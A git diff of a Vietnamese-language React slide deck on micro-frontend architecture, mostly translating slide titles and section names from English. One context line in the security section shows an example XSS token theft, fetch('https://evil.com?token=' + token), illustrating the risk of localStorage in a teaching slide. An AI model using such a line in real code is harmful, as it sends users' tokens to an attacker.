@@ -235,13 +235,13 @@ export const slides: SlideData[] = [
                 <div className="grid grid-cols-2 gap-4">
                     {[
                         { num: '01', title: 'Micro-Frontend Cơ bản', desc: 'Định nghĩa, vấn đề Monolith, lợi ích' },
-                        { num: '02', title: 'Module Federation', desc: 'Thuật ngữ, remoteEntry.js, Shared Dependencies' },
+                        { num: '02', title: 'Module Federation', desc: 'Thuật ngữ, remoteEntry.js, Chia sẻ Dependencies' },
                         { num: '03', title: 'Cấu hình Framework', desc: 'UmiJS, Vite, Webpack config' },
-                        { num: '04', title: 'Communication', desc: 'Event Bus, BroadcastChannel, Token Sync' },
-                        { num: '05', title: 'Security', desc: 'Token Storage, In-memory, Defense in Depth' },
-                        { num: '06', title: 'CSS Isolation', desc: 'Vấn đề CSS Conflict, CSS Modules' },
-                        { num: '07', title: 'Routing', desc: 'History Sync, Single History Pattern' },
-                        { num: '08', title: 'Troubleshooting', desc: 'Lỗi thường gặp & Cách fix' },
+                        { num: '04', title: 'Giao tiếp giữa các App', desc: 'Event Bus, BroadcastChannel, Đồng bộ Token' },
+                        { num: '05', title: 'Bảo mật', desc: 'Lưu trữ Token, In-memory, Bảo vệ đa lớp' },
+                        { num: '06', title: 'Cách ly CSS', desc: 'Vấn đề CSS Conflict, CSS Modules' },
+                        { num: '07', title: 'Định tuyến', desc: 'Đồng bộ History, Single History Pattern' },
+                        { num: '08', title: 'Xử lý lỗi', desc: 'Lỗi thường gặp & Cách fix' },
                     ].map((item, i) => (
                         <motion.div
                             key={item.num}
@@ -856,7 +856,7 @@ export default defineConfig({
     {
         id: 21,
         title: 'Các phương thức giao tiếp',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         content: (
             <div className="w-full max-w-5xl mx-auto">
                 <h2 className="text-slide-header mb-6">Các phương thức giao tiếp giữa MFE</h2>
@@ -880,7 +880,7 @@ export default defineConfig({
     {
         id: 22,
         title: '1. BroadcastChannel',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -897,7 +897,7 @@ export default defineConfig({
     {
         id: 23,
         title: 'BroadcastChannel - Code',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -937,7 +937,7 @@ channel.onmessage = (event) => {
     {
         id: 24,
         title: '2. MessageChannel',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -954,7 +954,7 @@ channel.onmessage = (event) => {
     {
         id: 25,
         title: '3. CustomEvent',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -991,7 +991,7 @@ window.addEventListener('user:selected',
     {
         id: 26,
         title: '4. Event Bus',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1008,7 +1008,7 @@ window.addEventListener('user:selected',
     {
         id: 27,
         title: 'Event Bus - Code',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         variant: 'code',
         content: (
             <div className="w-full max-w-4xl mx-auto">
@@ -1043,7 +1043,7 @@ export const eventBus = new EventBus();`}
     {
         id: 28,
         title: 'Ứng dụng: Đồng bộ Token',
-        section: 'Phần 4: Communication',
+        section: 'Phần 4: Giao tiếp',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1061,7 +1061,7 @@ export const eventBus = new EventBus();`}
     {
         id: 29,
         title: 'Vấn đề với localStorage',
-        section: 'Phần 5: Security',
+        section: 'Phần 5: Bảo mật',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1102,7 +1102,7 @@ fetch('https://evil.com?token=' + token);`}
     {
         id: 28,
         title: 'TokenStore Class',
-        section: 'Phần 5: Security',
+        section: 'Phần 5: Bảo mật',
         variant: 'code',
         content: (
             <div className="w-full max-w-4xl mx-auto">
@@ -1141,17 +1141,17 @@ export const tokenStore = new TokenStore();`}
     // Slide 28: Defense in Depth
     {
         id: 29,
-        title: 'Defense in Depth',
-        section: 'Phần 5: Security',
+        title: 'Bảo vệ đa lớp',
+        section: 'Phần 5: Bảo mật',
         content: (
             <div className="w-full max-w-5xl mx-auto">
-                <h2 className="text-slide-header mb-6">🛡️ Defense in Depth Strategy</h2>
+                <h2 className="text-slide-header mb-6">🛡️ Chiến lược Bảo vệ đa lớp</h2>
                 <div className="space-y-4">
                     {[
-                        { layer: '1', title: 'Prevent XSS', desc: 'CSP headers, sanitize input, Content-Security-Policy', color: 'blue' },
-                        { layer: '2', title: 'httpOnly Cookie', desc: 'Protect refresh token - JS không thể đọc', color: 'green' },
-                        { layer: '3', title: 'In-memory Storage', desc: 'Access token trong memory, khó truy cập hơn localStorage', color: 'purple' },
-                        { layer: '4', title: 'Short-lived Tokens', desc: 'Access token hết hạn nhanh (15-30 phút), limit damage', color: 'orange' },
+                        { layer: '1', title: 'Ngăn chặn XSS', desc: 'CSP headers, sanitize input, Content-Security-Policy', color: 'blue' },
+                        { layer: '2', title: 'httpOnly Cookie', desc: 'Bảo vệ refresh token - JS không thể đọc', color: 'green' },
+                        { layer: '3', title: 'Lưu trữ trong Memory', desc: 'Access token trong memory, khó truy cập hơn localStorage', color: 'purple' },
+                        { layer: '4', title: 'Token ngắn hạn', desc: 'Access token hết hạn nhanh (15-30 phút), giới hạn thiệt hại', color: 'orange' },
                     ].map((item, i) => (
                         <motion.div
                             key={item.layer}
@@ -1180,7 +1180,7 @@ export const tokenStore = new TokenStore();`}
     {
         id: 30,
         title: 'Vấn đề CSS Conflict',
-        section: 'Phần 6: CSS Isolation',
+        section: 'Phần 6: Cách ly CSS',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1210,7 +1210,7 @@ export const tokenStore = new TokenStore();`}
     {
         id: 31,
         title: 'CSS Isolation Strategies',
-        section: 'Phần 6: CSS Isolation',
+        section: 'Phần 6: Cách ly CSS',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1224,7 +1224,7 @@ export const tokenStore = new TokenStore();`}
     {
         id: 32,
         title: 'So sánh CSS Solutions',
-        section: 'Phần 6: CSS Isolation',
+        section: 'Phần 6: Cách ly CSS',
         content: (
             <div className="w-full max-w-5xl mx-auto">
                 <h2 className="text-slide-header mb-6">So sánh các giải pháp CSS</h2>
@@ -1248,7 +1248,7 @@ export const tokenStore = new TokenStore();`}
     {
         id: 33,
         title: 'CSS Modules - Ví dụ',
-        section: 'Phần 6: CSS Isolation',
+        section: 'Phần 6: Cách ly CSS',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1300,7 +1300,7 @@ const Button = ({ primary }) => (
     {
         id: 37,
         title: 'Routing trong MFE',
-        section: 'Phần 7: Routing',
+        section: 'Phần 7: Định tuyến',
         variant: 'diagram',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1313,8 +1313,8 @@ const Button = ({ primary }) => (
     // Slide 37: History Synchronization
     {
         id: 38,
-        title: 'History Synchronization',
-        section: 'Phần 7: Routing',
+        title: 'Đồng bộ History',
+        section: 'Phần 7: Định tuyến',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1362,7 +1362,7 @@ export function mount({ history, basename }) {
     {
         id: 39,
         title: 'Single History Instance',
-        section: 'Phần 7: Routing',
+        section: 'Phần 7: Định tuyến',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1402,8 +1402,8 @@ const ProductsApp = ({ history, basePath }) => (
     // Slide 39: Lazy Load Routes
     {
         id: 40,
-        title: 'Lazy Load Remote Routes',
-        section: 'Phần 7: Routing',
+        title: 'Lazy Load Route từ Remote',
+        section: 'Phần 7: Định tuyến',
         variant: 'code',
         content: (
             <div className="w-full max-w-4xl mx-auto">
@@ -1437,8 +1437,8 @@ const ProductsPage = () => {
     // Slide 40: Basename Routing Pattern - NEW
     {
         id: 41,
-        title: 'Basename Routing Pattern',
-        section: 'Phần 7: Routing',
+        title: 'Mẫu Basename Routing',
+        section: 'Phần 7: Định tuyến',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1488,8 +1488,8 @@ const App = ({ basename = '/users' }) => (
     // Slide 41: Route Scalability - NEW
     {
         id: 42,
-        title: 'Route Scalability',
-        section: 'Phần 7: Routing',
+        title: 'Khả năng mở rộng Route',
+        section: 'Phần 7: Định tuyến',
         content: (
             <div className="w-full max-w-5xl mx-auto">
                 <h2 className="text-slide-header mb-6">Route Scalability: Trước vs Sau</h2>
@@ -1536,8 +1536,8 @@ const App = ({ basename = '/users' }) => (
     // Slide 42: Dev Proxy Configuration - NEW
     {
         id: 43,
-        title: 'Dev Proxy Configuration',
-        section: 'Phần 7: Routing',
+        title: 'Cấu hình Dev Proxy',
+        section: 'Phần 7: Định tuyến',
         variant: 'code',
         content: (
             <div className="w-full max-w-5xl mx-auto">
@@ -1595,8 +1595,8 @@ remotes: [
     // Slide 43: Common Errors
     {
         id: 44,
-        title: 'Troubleshooting',
-        section: 'Phần 9: Troubleshooting',
+        title: 'Xử lý lỗi thường gặp',
+        section: 'Phần 8: Xử lý lỗi',
         content: (
             <div className="w-full max-w-5xl mx-auto">
                 <h2 className="text-slide-header mb-6">Lỗi thường gặp & Cách fix</h2>
